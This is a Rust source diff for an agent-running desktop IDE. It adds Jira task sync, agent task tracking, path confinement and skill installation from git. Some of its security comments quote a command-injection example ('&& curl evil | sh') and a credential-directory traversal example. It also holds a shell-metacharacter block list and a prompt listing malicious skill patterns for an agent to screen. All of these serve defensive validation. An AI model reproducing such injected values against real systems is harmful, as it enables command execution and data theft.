@@ -6,13 +6,18 @@ mod claude;
 mod edits;
 mod fs;
 mod git;
+mod guard;
 mod intent;
+mod jira;
 mod judge;
 mod run;
+mod secrets;
 mod session;
 mod settings;
+mod skills;
 mod store;
 mod summary;
+mod tasktrack;
 
 use claude::{ClaudeSession, ClaudeUsage};
 use edits::EditRecord;
@@ -217,12 +222,27 @@ fn spawn_agent(
 ) -> Result<AgentRecord, String> {
     let project = store.get_project(&project_id).ok_or("unknown project")?;
 
-    // Resolve the working dir — a service may run in a monorepo subdir.
+    // Resolve the working dir — a service may run in a monorepo subdir. The
+    // subdir comes from a run config (which may be AI-generated or repo-supplied),
+    // so it must stay INSIDE the project: reject absolute paths and `..` segments.
+    // Without this, `Path::join` with an absolute `sub` (e.g. "/Users/you/.ssh")
+    // silently replaces the project root, letting an untrusted config point the
+    // spawned PTY's working directory anywhere on disk.
     let cwd = match subdir.filter(|s| !s.trim().is_empty()) {
-        Some(sub) => std::path::Path::new(&project.path)
-            .join(sub)
-            .to_string_lossy()
-            .to_string(),
+        Some(sub) => {
+            let rel = std::path::Path::new(&sub);
+            if rel.is_absolute()
+                || rel
+                    .components()
+                    .any(|c| matches!(c, std::path::Component::ParentDir))
+            {
+                return Err("invalid working directory".into());
+            }
+            std::path::Path::new(&project.path)
+                .join(rel)
+                .to_string_lossy()
+                .to_string()
+        }
         None => project.path.clone(),
     };
 
@@ -245,12 +265,16 @@ fn spawn_agent(
 
     let rec = store.add_agent(&project_id, &title, &command, &cwd);
 
-    // Per-agent edit tracking: managed skill block + log path for this agent.
+    // Per-agent edit + task tracking: managed skill blocks + log paths.
     let _ = edits::ensure_skill(&project.path);
+    let _ = tasktrack::ensure_skill(&project.path);
     let edits_path = edits::edits_path(&project.path, &rec.id);
+    let tasks_path = tasktrack::tasks_path(&project.path, &rec.id);
     if let Some(dir) = edits_path.parent() {
         let _ = std::fs::create_dir_all(dir);
     }
+    // Read-only "find task" snapshot of this project's open tasks for the agent.
+    let project_tasks_path = write_project_tasks(&store, &project.path, &project_id, &rec.id);
 
     manager.spawn(
         app,
@@ -259,6 +283,8 @@ fn spawn_agent(
         cwd,
         command,
         edits_path.to_string_lossy().to_string(),
+        tasks_path.to_string_lossy().to_string(),
+        project_tasks_path,
         rows.unwrap_or(24),
         cols.unwrap_or(80),
     )?;
@@ -287,10 +313,14 @@ fn resume_agent(
         .map(|p| p.path)
         .unwrap_or_else(|| rec.cwd.clone());
     let _ = edits::ensure_skill(&project_root);
+    let _ = tasktrack::ensure_skill(&project_root);
     let edits_path = edits::edits_path(&project_root, &rec.id);
+    let tasks_path = tasktrack::tasks_path(&project_root, &rec.id);
     if let Some(dir) = edits_path.parent() {
         let _ = std::fs::create_dir_all(dir);
     }
+    // Refresh the read-only "find task" snapshot for the resumed agent.
+    let project_tasks_path = write_project_tasks(&store, &project_root, &rec.project_id, &rec.id);
 
     manager.spawn(
         app,
@@ -299,6 +329,8 @@ fn resume_agent(
         rec.cwd.clone(),
         command,
         edits_path.to_string_lossy().to_string(),
+        tasks_path.to_string_lossy().to_string(),
+        project_tasks_path,
         rows.unwrap_or(24),
         cols.unwrap_or(80),
     )?;
@@ -496,13 +528,277 @@ fn add_task(
     title: String,
     agent_id: Option<String>,
     planned_for: Option<String>,
+    description: Option<String>,
 ) -> Task {
-    store.add_task(&project_id, &title, agent_id, planned_for)
+    store.add_task(&project_id, &title, agent_id, planned_for, description)
 }
 
 #[tauri::command]
-fn update_task(store: State<Store>, id: String, status: String) {
-    store.update_task(&id, &status)
+async fn update_task(store: State<'_, Store>, id: String, status: String) -> Result<(), String> {
+    store.update_task(&id, &status);
+    // Two-way sync: a Jira-sourced task pushes its new lifecycle state back as a
+    // Jira transition (AI-mapped onto this board's custom workflow) AND a comment,
+    // so the ticket's history shows what happened. Best-effort + off-thread.
+    if let Some(task) = store.get_task(&id) {
+        if task.source == "jira" {
+            if let (Some(key), Some(cfg)) = (task.external_id, secrets::load_jira()) {
+                let st = status.clone();
+                let title = task.title.clone();
+                let _ = tauri::async_runtime::spawn_blocking(move || {
+                    jira_push_status(&cfg, &key, &st, &title)
+                })
+                .await;
+            }
+        }
+    }
+    Ok(())
+}
+
+/// Push a lifecycle change onto a Jira issue: transition it (AI-mapped onto the
+/// board's actual workflow, falling back to the status-category heuristic) and
+/// leave a comment recording the change. All best-effort.
+fn jira_push_status(cfg: &secrets::JiraConfig, key: &str, status: &str, title: &str) {
+    // Prefer an AI mapping from our lifecycle word → this board's transition.
+    let applied = match jira::list_transitions(cfg, key) {
+        Ok(trs) if !trs.is_empty() => {
+            let opts: Vec<String> = trs
+                .iter()
+                .map(|t| format!("{} → {} [{}]", t.name, t.to_status, t.to_category))
+                .collect();
+            match judge::pick_transition(status, &opts) {
+                Some(i) => jira::apply_transition(cfg, key, &trs[i].id).is_ok(),
+                None => jira::transition_issue(cfg, key, status).is_ok(),
+            }
+        }
+        _ => jira::transition_issue(cfg, key, status).is_ok(),
+    };
+    let label = match status {
+        "doing" => "In progress",
+        "done" => "Done",
+        "verified" => "Verified",
+        _ => "To do",
+    };
+    let note = if applied {
+        format!("EvorIDE: “{title}” moved to {label}.")
+    } else {
+        format!("EvorIDE: “{title}” is now {label} (status couldn't be transitioned automatically).")
+    };
+    let _ = jira::add_comment(cfg, key, &note);
+}
+
+#[tauri::command]
+fn set_task_description(store: State<Store>, id: String, description: String) {
+    store.set_task_description(&id, &description)
+}
+
+/// Replace a task's breakdown steps.
+#[tauri::command]
+fn set_task_steps(store: State<Store>, id: String, steps: Vec<store::Step>) {
+    store.set_task_steps(&id, &steps)
+}
+
+/// Update one step's status within a task's breakdown.
+#[tauri::command]
+fn update_step(store: State<Store>, task_id: String, step_id: String, status: String) -> Option<Task> {
+    let mut task = store.get_task(&task_id)?;
+    for s in task.steps.iter_mut() {
+        if s.id == step_id {
+            s.status = status.clone();
+        }
+    }
+    store.set_task_steps(&task_id, &task.steps);
+    store.get_task(&task_id)
+}
+
+/// Break a task down into ordered steps using the AI helper acting as an
+/// architect, store them, and return the updated task. Errors if no helper.
+#[tauri::command]
+async fn breakdown_task(store: State<'_, Store>, id: String) -> Result<Task, String> {
+    let task = store.get_task(&id).ok_or("unknown task")?;
+    let title = task.title.clone();
+    let desc = task.description.clone().unwrap_or_default();
+    let steps = tauri::async_runtime::spawn_blocking(move || judge::plan_steps(&title, &desc))
+        .await
+        .map_err(|e| e.to_string())?
+        .ok_or_else(|| "No AI helper (claude/codex) found, or it returned nothing.".to_string())?;
+    if steps.is_empty() {
+        return Err("The architect couldn't break this down.".into());
+    }
+    store.set_task_steps(&id, &steps);
+    store.get_task(&id).ok_or_else(|| "task vanished".into())
+}
+
+/// Write the read-only "find task" snapshot for an agent: this project's OPEN
+/// tasks (todo|doing) as JSON at `project-tasks.json`. The agent reads it via
+/// `$EVORIDE_PROJECT_TASKS` to find what to work on. Returns the path (string)
+/// to hand to the pty env. Best-effort — failures degrade to a missing file,
+/// which the skill block treats as "no tracked tasks".
+fn write_project_tasks(store: &Store, project_root: &str, project_id: &str, agent_id: &str) -> String {
+    let path = tasktrack::project_tasks_path(project_root, agent_id);
+    if let Some(dir) = path.parent() {
+        let _ = std::fs::create_dir_all(dir);
+    }
+    let open: Vec<Task> = store
+        .list_tasks(project_id)
+        .into_iter()
+        .filter(|t| t.status != "done")
+        .collect();
+    if let Ok(json) = serde_json::to_string_pretty(&open) {
+        let _ = std::fs::write(&path, json);
+    }
+    path.to_string_lossy().to_string()
+}
+
+/// Pull an agent's reported task updates (from `$EVORIDE_TASKS`), in order, and
+/// apply them. An agent declares NEW work with `{"new_task":"…"}` — that creates
+/// (or re-targets) an EvorIDE task for the agent's project, marks it in-progress,
+/// links it to the agent, and makes it the "current" task; later status/step/note
+/// lines apply to whatever the current task is. Each log line is consumed exactly
+/// once (a per-agent cursor), so creates and notes don't duplicate across polls.
+/// Returns every task touched this round so the UI can upsert (add or update).
+#[tauri::command]
+fn ingest_agent_tasks(store: State<Store>, project: String, agent_id: String) -> Vec<Task> {
+    let (updates, cursor) = tasktrack::read_updates_since(&project, &agent_id);
+    if updates.is_empty() {
+        // Still advance the cursor past any malformed/empty trailing lines.
+        tasktrack::write_cursor(&project, &agent_id, cursor);
+        return Vec::new();
+    }
+
+    // The agent's project (for new-task creates), and existing titles → id so a
+    // `new_task` never duplicates a task that already exists (created or re-runs).
+    let project_id = store.get_agent(&agent_id).map(|a| a.project_id);
+    let mut by_title: std::collections::HashMap<String, String> = std::collections::HashMap::new();
+    if let Some(pid) = &project_id {
+        for t in store.list_tasks(pid) {
+            by_title.insert(t.title.trim().to_lowercase(), t.id);
+        }
+    }
+
+    // Current task we're reporting against — starts at the agent's linked task.
+    let mut current: Option<String> = store.task_for_agent(&agent_id).map(|t| t.id);
+    let day = summary::today();
+    let mut touched: std::collections::HashSet<String> = std::collections::HashSet::new();
+
+    for u in &updates {
+        // New task: create (or re-target) and switch the current task to it.
+        if let Some(title) = u.new_task.as_deref().map(str::trim).filter(|s| !s.is_empty()) {
+            let key = title.to_lowercase();
+            let id = if let Some(existing) = by_title.get(&key) {
+                let id = existing.clone();
+                store.set_task_agent(&id, &agent_id); // round-trip status to this agent
+                id
+            } else if let Some(pid) = &project_id {
+                let desc = u
+                    .description
+                    .as_deref()
+                    .or(u.note.as_deref())
+                    .map(str::trim)
+                    .filter(|s| !s.is_empty())
+                    .map(|s| s.to_string());
+                let t = store.add_task(pid, title, Some(agent_id.clone()), Some(day.clone()), desc);
+                store.update_task(&t.id, "doing"); // starting on it now
+                by_title.insert(key, t.id.clone());
+                t.id
+            } else {
+                continue; // no project to attach to
+            };
+            touched.insert(id.clone());
+            current = Some(id);
+            continue;
+        }
+
+        let Some(cur) = current.clone() else { continue };
+
+        // Step status: match by id or case-insensitive title contains.
+        if let Some(stepref) = u.step.as_deref() {
+            if let Some(mut task) = store.get_task(&cur) {
+                let want = u.status.as_deref().unwrap_or("done");
+                let key = stepref.trim().to_lowercase();
+                let mut hit = false;
+                for st in task.steps.iter_mut() {
+                    if st.id == stepref || st.title.to_lowercase().contains(&key) {
+                        st.status = want.to_string();
+                        hit = true;
+                    }
+                }
+                if hit {
+                    store.set_task_steps(&cur, &task.steps);
+                    touched.insert(cur.clone());
+                }
+            }
+            continue;
+        }
+
+        // Task status.
+        if let Some(s) = u.status.as_deref() {
+            if matches!(s, "todo" | "doing" | "done") {
+                store.update_task(&cur, s);
+                touched.insert(cur.clone());
+            }
+        }
+
+        // Free-text progress note → appended to the current task's description.
+        if let Some(n) = u.note.as_deref().map(str::trim).filter(|s| !s.is_empty()) {
+            store.append_task_description(&cur, &format!("• {n}"));
+            touched.insert(cur.clone());
+        }
+    }
+
+    // Consume the lines we just applied so the next poll starts after them.
+    tasktrack::write_cursor(&project, &agent_id, cursor);
+
+    // Mirror status back to Jira for any touched Jira ticket (fire-and-forget).
+    for id in &touched {
+        if let Some(t) = store.get_task(id) {
+            if t.source == "jira" {
+                if let (Some(key), Some(cfg)) = (t.external_id.clone(), secrets::load_jira()) {
+                    let (st, title) = (t.status.clone(), t.title.clone());
+                    std::thread::spawn(move || jira_push_status(&cfg, &key, &st, &title));
+                }
+            }
+        }
+    }
+
+    touched
+        .into_iter()
+        .filter_map(|id| store.get_task(&id))
+        .collect()
+}
+
+/// Turn a freeform note into one or more structured tasks via the AI helper
+/// (`claude -p` / `codex`), matching each to a project by name. Runs the slow
+/// helper off-thread; created tasks are planned for today. Errors if no helper.
+#[tauri::command]
+async fn plan_tasks(store: State<'_, Store>, input: String) -> Result<Vec<Task>, String> {
+    let input = input.trim().to_string();
+    if input.is_empty() {
+        return Err("Nothing to plan.".into());
+    }
+    let projects: Vec<(String, String, String)> = store
+        .list_projects()
+        .into_iter()
+        .map(|p| (p.id, p.name, p.path))
+        .collect();
+    let day = summary::today();
+    let planned = tauri::async_runtime::spawn_blocking(move || judge::plan_tasks(&input, &projects))
+        .await
+        .map_err(|e| e.to_string())?;
+    let planned = planned
+        .ok_or_else(|| "No AI helper (claude/codex) found, or it returned nothing.".to_string())?;
+    if planned.is_empty() {
+        return Err("Couldn't extract any tasks from that.".into());
+    }
+    let mut created = Vec::new();
+    for p in planned {
+        let mut t = store.add_task(&p.project_id, &p.title, None, Some(day.clone()), None);
+        if p.status != "todo" {
+            store.update_task(&t.id, &p.status);
+            t.status = p.status;
+        }
+        created.push(t);
+    }
+    Ok(created)
 }
 
 /// Assign a task to a project ("" = unassigned).
@@ -511,37 +807,410 @@ fn assign_task(store: State<Store>, id: String, project_id: String) {
     store.set_task_project(&id, &project_id)
 }
 
+/// Link a task to the agent now working it (so its reported status round-trips).
+#[tauri::command]
+fn link_task_agent(store: State<Store>, id: String, agent_id: String) {
+    store.set_task_agent(&id, &agent_id)
+}
+
 #[tauri::command]
 fn delete_task(store: State<Store>, id: String) {
     store.delete_task(&id)
 }
 
+/// Append a line to a task's description — used to merge a duplicate's wording
+/// into the existing task.
+#[tauri::command]
+fn append_task_note(store: State<Store>, id: String, note: String) {
+    let n = note.trim();
+    if !n.is_empty() {
+        store.append_task_description(&id, n);
+    }
+}
+
+/// A possible duplicate the user is warned about before a task is created.
+#[derive(serde::Serialize)]
+struct DuplicateHit {
+    task_id: String,
+    task_title: String,
+    task_status: String,
+    reason: String,
+}
+
+/// Ask the AI helper whether `title` duplicates an existing task. Checks the
+/// target project plus Unassigned (where overlaps usually hide); when no project
+/// is given, checks everything. Returns the match (with its title/status) or
+/// None — also None when no helper is configured, so creation never blocks.
+#[tauri::command]
+async fn check_duplicate_task(
+    store: State<'_, Store>,
+    title: String,
+    project_id: String,
+) -> Result<Option<DuplicateHit>, String> {
+    let tasks = if project_id.trim().is_empty() {
+        store.list_all_tasks()
+    } else {
+        let mut t = store.list_tasks(&project_id);
+        t.extend(store.list_tasks("")); // include Unassigned
+        t
+    };
+    if tasks.is_empty() {
+        return Ok(None);
+    }
+    let existing: Vec<(String, String, String)> = tasks
+        .iter()
+        .map(|t| (t.id.clone(), t.title.clone(), t.status.clone()))
+        .collect();
+    let cand = title.clone();
+    let hit = tauri::async_runtime::spawn_blocking(move || judge::check_duplicate(&cand, &existing))
+        .await
+        .map_err(|e| e.to_string())?;
+    Ok(hit.and_then(|h| {
+        tasks.iter().find(|t| t.id == h.task_id).map(|t| DuplicateHit {
+            task_id: t.id.clone(),
+            task_title: t.title.clone(),
+            task_status: t.status.clone(),
+            reason: h.reason,
+        })
+    }))
+}
+
+// --- Jira (two-way task sync) ---
+
+/// Config returned to the UI — never includes the token, just whether one is set.
+#[derive(serde::Serialize)]
+struct JiraPublic {
+    base_url: String,
+    email: String,
+    jql: String,
+    project_map: std::collections::HashMap<String, String>,
+    has_token: bool,
+}
+
+/// Result of a pull/sync, for a UI toast.
+#[derive(serde::Serialize)]
+struct JiraSyncResult {
+    pulled: usize,
+    created: usize,
+    updated: usize,
+    /// Issues that landed in Unassigned because their project key isn't mapped.
+    unmapped: usize,
+}
+
+#[tauri::command]
+fn jira_config_get() -> Option<JiraPublic> {
+    secrets::load_jira().map(|c| JiraPublic {
+        has_token: !c.token.trim().is_empty(),
+        base_url: c.base_url,
+        email: c.email,
+        jql: c.jql,
+        project_map: c.project_map,
+    })
+}
+
+#[tauri::command]
+fn jira_config_set(
+    base_url: String,
+    email: String,
+    token: String,
+    jql: String,
+    project_map: std::collections::HashMap<String, String>,
+) -> Result<(), String> {
+    // Blank token = keep the one already stored (so editing other fields in the
+    // UI doesn't force re-entering the secret).
+    let token = if token.trim().is_empty() {
+        secrets::load_jira().map(|c| c.token).unwrap_or_default()
+    } else {
+        token
+    };
+    // Require https so the Basic-auth token is never sent in cleartext (and to
+    // narrow the SSRF surface of the user-supplied base URL). Plain http is only
+    // tolerated for a localhost self-hosted instance.
+    let b = base_url.trim();
+    let is_localhost = b.starts_with("http://localhost")
+        || b.starts_with("http://127.0.0.1")
+        || b.starts_with("http://[::1]");
+    if !(b.starts_with("https://") || is_localhost) {
+        return Err("Jira base URL must start with https:// .".into());
+    }
+    let cfg = secrets::JiraConfig {
+        base_url,
+        email,
+        token,
+        jql,
+        project_map,
+    };
+    if !cfg.is_usable() {
+        return Err("Base URL, email, and API token are all required.".into());
+    }
+    secrets::save_jira(Some(cfg))
+}
+
+#[tauri::command]
+fn jira_disconnect() -> Result<(), String> {
+    secrets::save_jira(None)
+}
+
+/// Verify the connection by counting issues the JQL matches.
+#[tauri::command]
+async fn jira_test() -> Result<usize, String> {
+    let cfg = secrets::load_jira().ok_or("Jira isn't configured yet.")?;
+    let issues = tauri::async_runtime::spawn_blocking(move || jira::fetch_issues(&cfg))
+        .await
+        .map_err(|e| e.to_string())??;
+    Ok(issues.len())
+}
+
+/// Pull issues (JQL → tasks) and upsert them by issue key. Status flows
+/// Jira→local here; local→Jira flows on `update_task` (transitions).
+#[tauri::command]
+async fn jira_sync(store: State<'_, Store>) -> Result<JiraSyncResult, String> {
+    let cfg = secrets::load_jira().ok_or("Jira isn't configured. Add your token in Settings.")?;
+    let map = cfg.project_map.clone();
+    let fetch_cfg = cfg.clone();
+    let issues = tauri::async_runtime::spawn_blocking(move || jira::fetch_issues(&fetch_cfg))
+        .await
+        .map_err(|e| e.to_string())??;
+
+    let pulled = issues.len();
+    let (mut created, mut updated, mut unmapped) = (0, 0, 0);
+    for it in issues {
+        // Don't flood the board with already-done Jira issues: only sync a done
+        // issue if it's already tracked here (e.g. we completed it in EvorIDE).
+        let tracked = store.task_by_external_id("jira", &it.key).is_some();
+        if it.status == "done" && !tracked {
+            continue;
+        }
+        let pid = map.get(&it.project_key).cloned().unwrap_or_default();
+        if pid.is_empty() {
+            unmapped += 1;
+        }
+        if let Some((_, inserted)) = store.upsert_external_task(
+            "jira",
+            &it.key,
+            Some(&it.url),
+            &pid,
+            &it.summary,
+            &it.status,
+            it.description.as_deref(),
+        ) {
+            if inserted {
+                created += 1;
+            } else {
+                updated += 1;
+            }
+        }
+    }
+    Ok(JiraSyncResult {
+        pulled,
+        created,
+        updated,
+        unmapped,
+    })
+}
+
+/// A Jira issue assigned to me, for the "import to my workflow" picker. Live
+/// (not stored) — `imported` says whether it's already on the board.
+#[derive(serde::Serialize)]
+struct JiraIssueDto {
+    key: String,
+    summary: String,
+    status: String,
+    /// Real Jira status name (e.g. "In Review"), for display.
+    status_name: String,
+    description: Option<String>,
+    project_key: String,
+    url: String,
+    imported: bool,
+}
+
+/// The issues currently assigned to me on Jira (live), flagged with whether
+/// each is already imported as a task. The Tasks page shows these so the user
+/// can pull individual tickets into their workflow.
+#[tauri::command]
+async fn jira_my_issues(store: State<'_, Store>) -> Result<Vec<JiraIssueDto>, String> {
+    let cfg = secrets::load_jira().ok_or("Jira isn't connected. Add it in Settings → Jira.")?;
+    let issues = tauri::async_runtime::spawn_blocking(move || jira::fetch_issues(&cfg))
+        .await
+        .map_err(|e| e.to_string())??;
+    let imported: std::collections::HashSet<String> = store
+        .list_all_tasks()
+        .into_iter()
+        .filter(|t| t.source == "jira")
+        .filter_map(|t| t.external_id)
+        .collect();
+    Ok(issues
+        .into_iter()
+        .map(|it| JiraIssueDto {
+            imported: imported.contains(&it.key),
+            key: it.key,
+            summary: it.summary,
+            status: it.status,
+            status_name: it.status_name,
+            description: it.description,
+            project_key: it.project_key,
+            url: it.url,
+        })
+        .collect())
+}
+
+/// Import a Jira issue into the board as a task (Unassigned — the user/agent
+/// relates it to a repo). Returns the created/updated task.
+#[tauri::command]
+fn jira_import(
+    store: State<Store>,
+    key: String,
+    summary: String,
+    status: String,
+    description: Option<String>,
+    url: String,
+    planned_for: Option<String>,
+) -> Option<Task> {
+    let task = store
+        .upsert_external_task("jira", &key, Some(&url), "", &summary, &status, description.as_deref())
+        .map(|(t, _)| t)?;
+    // "Import to today" — schedule it for the given day so it lands in Today.
+    if let Some(day) = planned_for.filter(|d| !d.trim().is_empty()) {
+        store.set_task_planned_for(&task.id, &day);
+    }
+    store.get_task(&task.id)
+}
+
+/// A Jira project the account can file into (for the push-to-Jira picker).
+#[derive(serde::Serialize)]
+struct JiraProjectDto {
+    key: String,
+    name: String,
+}
+
+/// List Jira projects the account can see (for the "which board?" picker).
+#[tauri::command]
+async fn jira_projects() -> Result<Vec<JiraProjectDto>, String> {
+    let cfg = secrets::load_jira().ok_or("Jira isn't connected. Add it in Settings → Jira.")?;
+    let ps = tauri::async_runtime::spawn_blocking(move || jira::list_projects(&cfg))
+        .await
+        .map_err(|e| e.to_string())??;
+    Ok(ps.into_iter().map(|(key, name)| JiraProjectDto { key, name }).collect())
+}
+
+/// Push a LOCAL task up to Jira: create a new issue and link the task to it. The
+/// target board comes from `project_key` if given, else the project mapped to
+/// this task's project. Errors if it's already a Jira task or no board is known.
+#[tauri::command]
+async fn jira_create_from_task(
+    store: State<'_, Store>,
+    id: String,
+    project_key: Option<String>,
+) -> Result<Task, String> {
+    let cfg = secrets::load_jira().ok_or("Jira isn't connected. Add it in Settings → Jira.")?;
+    let task = store.get_task(&id).ok_or("Unknown task.")?;
+    if task.source == "jira" && task.external_id.is_some() {
+        return Err("This task is already linked to a Jira issue.".into());
+    }
+    // Explicit board (from the picker) wins; otherwise reverse the project map
+    // (Jira KEY → project id) to find where to file it.
+    let project_key = project_key
+        .filter(|k| !k.trim().is_empty())
+        .or_else(|| {
+            cfg.project_map
+                .iter()
+                .find(|(_, pid)| **pid == task.project_id)
+                .map(|(k, _)| k.clone())
+        })
+        .ok_or("Pick a Jira project to file this into.")?;
+
+    let summary = task.title.clone();
+    let description = task.description.clone();
+    let create_cfg = cfg.clone();
+    let (key, url) = tauri::async_runtime::spawn_blocking(move || {
+        jira::create_issue(&create_cfg, &project_key, &summary, description.as_deref())
+    })
+    .await
+    .map_err(|e| e.to_string())??;
+
+    store.set_task_external(&id, "jira", &key, &url);
+    store.get_task(&id).ok_or_else(|| "Task vanished after linking.".into())
+}
+
+/// Let the AI helper assign currently-unassigned tasks to a project by matching
+/// their wording to project names/repos. Returns how many it placed. Runs the
+/// helper off-thread. (Use after a Jira sync, since one board spans many repos.)
+#[tauri::command]
+async fn auto_assign_tasks(store: State<'_, Store>) -> Result<usize, String> {
+    let unassigned: Vec<(String, String)> = store
+        .list_all_tasks()
+        .into_iter()
+        .filter(|t| t.project_id.trim().is_empty())
+        .map(|t| {
+            let detail = t.description.as_deref().unwrap_or("");
+            let label = if detail.is_empty() {
+                t.title.clone()
+            } else {
+                format!("{} — {}", t.title, detail.chars().take(140).collect::<String>())
+            };
+            (t.id, label)
+        })
+        .collect();
+    if unassigned.is_empty() {
+        return Ok(0);
+    }
+    let projects: Vec<(String, String, String)> = store
+        .list_projects()
+        .into_iter()
+        .map(|p| (p.id, p.name, p.path))
+        .collect();
+    if projects.is_empty() {
+        return Ok(0);
+    }
+    let assigns = tauri::async_runtime::spawn_blocking(move || judge::assign_projects(&unassigned, &projects))
+        .await
+        .map_err(|e| e.to_string())?
+        .ok_or_else(|| "No AI helper (claude/codex) found.".to_string())?;
+    let mut n = 0;
+    for (task_id, project_id) in assigns {
+        store.set_task_project(&task_id, &project_id);
+        n += 1;
+    }
+    Ok(n)
+}
+
 // --- files ---
 
+// All file commands confine their path to a registered project root first
+// (see `guard::confine`) so the webview can't read or write outside the
+// projects the user has opened.
+
 #[tauri::command]
-fn read_dir(path: String) -> Result<Vec<FileEntry>, String> {
-    fs::read_dir(&path)
+fn read_dir(store: State<Store>, path: String) -> Result<Vec<FileEntry>, String> {
+    let p = guard::confine(&guard::project_roots(&store), &path)?;
+    fs::read_dir(&p.to_string_lossy())
 }
 
 #[tauri::command]
-fn read_file(path: String) -> Result<FileContent, String> {
-    fs::read_file(&path)
+fn read_file(store: State<Store>, path: String) -> Result<FileContent, String> {
+    let p = guard::confine(&guard::project_roots(&store), &path)?;
+    fs::read_file(&p.to_string_lossy())
 }
 
 #[tauri::command]
-fn write_file(path: String, content: String) -> Result<(), String> {
-    fs::write_file(&path, &content)
+fn write_file(store: State<Store>, path: String, content: String) -> Result<(), String> {
+    let p = guard::confine(&guard::project_roots(&store), &path)?;
+    fs::write_file(&p.to_string_lossy(), &content)
 }
 
 #[tauri::command]
-fn create_file(path: String) -> Result<(), String> {
-    fs::create_file(&path)
+fn create_file(store: State<Store>, path: String) -> Result<(), String> {
+    let p = guard::confine(&guard::project_roots(&store), &path)?;
+    fs::create_file(&p.to_string_lossy())
 }
 
 /// Recursive repo-relative file list for the command palette (Go to File).
 #[tauri::command]
-fn list_files(path: String) -> Vec<String> {
-    fs::list_files(&path)
+fn list_files(store: State<Store>, path: String) -> Vec<String> {
+    match guard::confine(&guard::project_roots(&store), &path) {
+        Ok(p) => fs::list_files(&p.to_string_lossy()),
+        Err(_) => Vec::new(),
+    }
 }
 
 // --- claude sessions ---
@@ -635,24 +1304,46 @@ fn run_setup_prompt(project_id: String) -> String {
 
 // --- intent docs ---
 
-#[tauri::command]
-fn intent_config(path: String) -> IntentConfig {
-    intent::read_config(&path)
+// Intent commands write managed files (CLAUDE.md/AGENTS.md/.intentflow/…) under
+// the project root, so confirm the path IS a registered project root before
+// touching anything.
+fn require_project_root(store: &Store, path: &str) -> Result<String, String> {
+    let roots = guard::project_roots(store);
+    let p = guard::confine(&roots, path)?;
+    Ok(p.to_string_lossy().into_owned())
 }
 
 #[tauri::command]
-fn set_intent(path: String, enabled: bool, mode: String) -> Result<IntentConfig, String> {
-    intent::set_enabled(&path, enabled, &mode)
+fn intent_config(store: State<Store>, path: String) -> IntentConfig {
+    match require_project_root(&store, &path) {
+        Ok(p) => intent::read_config(&p),
+        Err(_) => IntentConfig::default(),
+    }
 }
 
 #[tauri::command]
-fn read_intent(path: String) -> String {
-    intent::read_doc(&path)
+fn set_intent(
+    store: State<Store>,
+    path: String,
+    enabled: bool,
+    mode: String,
+) -> Result<IntentConfig, String> {
+    let p = require_project_root(&store, &path)?;
+    intent::set_enabled(&p, enabled, &mode)
 }
 
 #[tauri::command]
-fn update_intent(path: String) -> Result<String, String> {
-    intent::update(&path)
+fn read_intent(store: State<Store>, path: String) -> String {
+    match require_project_root(&store, &path) {
+        Ok(p) => intent::read_doc(&p),
+        Err(_) => String::new(),
+    }
+}
+
+#[tauri::command]
+fn update_intent(store: State<Store>, path: String) -> Result<String, String> {
+    let p = require_project_root(&store, &path)?;
+    intent::update(&p)
 }
 
 // --- per-agent edits ---
@@ -690,6 +1381,108 @@ fn get_settings(settings: State<SettingsStore>) -> Settings {
 #[tauri::command]
 fn set_daily_summary(settings: State<SettingsStore>, enabled: bool) -> Settings {
     settings.set_daily_summary(enabled)
+}
+
+// --- skills ---
+
+/// Bundled skills with their current enabled state, for Settings → Skills.
+#[tauri::command]
+fn list_skills(settings: State<SettingsStore>) -> Vec<skills::SkillInfo> {
+    skills::list(&settings.skills_disabled())
+}
+
+/// Toggle a bundled skill: persist the choice and install/remove its files in
+/// the global skills dirs so every agent (Claude, Codex, …) picks up the change.
+#[tauri::command]
+fn set_skill_enabled(settings: State<SettingsStore>, id: String, enabled: bool) {
+    settings.set_skill_disabled(&id, !enabled);
+    skills::set_enabled(&id, enabled);
+}
+
+/// Remove a git-installed (external) skill from every managed root. Bundled
+/// skills are toggled via `set_skill_enabled`, not removed.
+#[tauri::command]
+fn remove_skill(id: String) {
+    skills::remove(&id);
+}
+
+/// Install a skill from a git repo, driven by Claude Code: it clones the repo,
+/// verifies it's a real & safe agent skill (a `SKILL.md` with name+description),
+/// and installs it into the global skills dirs (with our managed marker so it
+/// shows up + can be removed). Returns a short status line; errors carry why it
+/// was refused (not a skill, looked unsafe, no CLI, …). Runs headless so it works
+/// even with no project open.
+#[tauri::command]
+async fn install_skill_from_git(repo: String) -> Result<String, String> {
+    let url = repo.trim().to_string();
+    if url.is_empty() {
+        return Err("Enter a git repository URL.".into());
+    }
+    // The URL is interpolated into a `git clone … {url}` step that an autonomous
+    // agent then runs in ITS OWN shell, so validate it tightly: cleartext http://
+    // is dropped (use https/ssh), and any whitespace or shell metacharacter is
+    // rejected so a value like `https://h/r && curl evil | sh` or `$(…)` can't
+    // turn into agent-shell command injection independent of the safety review.
+    let url = url.trim();
+    let looks_git =
+        url.starts_with("https://") || url.starts_with("git@") || url.starts_with("ssh://");
+    if !looks_git {
+        return Err("Use an https://…, git@…, or ssh://… URL (http:// isn't allowed).".into());
+    }
+    if url
+        .chars()
+        .any(|c| c.is_whitespace() || "\"'`$;|&<>(){}[]\\!*?~\n\r".contains(c))
+    {
+        return Err("That git URL contains characters that aren't allowed.".into());
+    }
+
+    let claude_dir = "~/.claude/skills";
+    let agents_dir = "~/.agents/skills";
+    let marker = skills::MARKER;
+    let marker_body = skills::MARKER_BODY.trim_end();
+    let prompt = format!(
+        "You are installing an agent SKILL from a git repository for EvorIDE. Work \
+autonomously; do not ask me anything. Repo: {url}\n\
+1. Shallow-clone it into a temp dir: `git clone --depth 1 {url} <tmp>`.\n\
+2. Find a `SKILL.md` (repo root or ONE directory deep). If there is none, it is NOT a \
+valid skill — STOP and report that.\n\
+3. Read its YAML frontmatter: it must have `name` and `description`. Derive a \
+kebab-case skill id from `name` (or the SKILL.md's folder name).\n\
+4. SAFETY: skim SKILL.md and any scripts/commands it ships. If it looks malicious or \
+destructive (data exfiltration, credential theft, `rm -rf` of home/system, fork bombs, \
+etc.), REFUSE — do not install — and report why.\n\
+5. If valid AND safe, copy the skill's directory (the folder containing SKILL.md and any \
+references) into BOTH `{claude_dir}/<id>/` and `{agents_dir}/<id>/` (create dirs as \
+needed; expand ~ to $HOME). In EACH installed dir also write a file named `{marker}` \
+containing exactly: {marker_body}\n\
+6. Delete the temp clone.\n\
+Finish with EXACTLY ONE last line of JSON and nothing after it: \
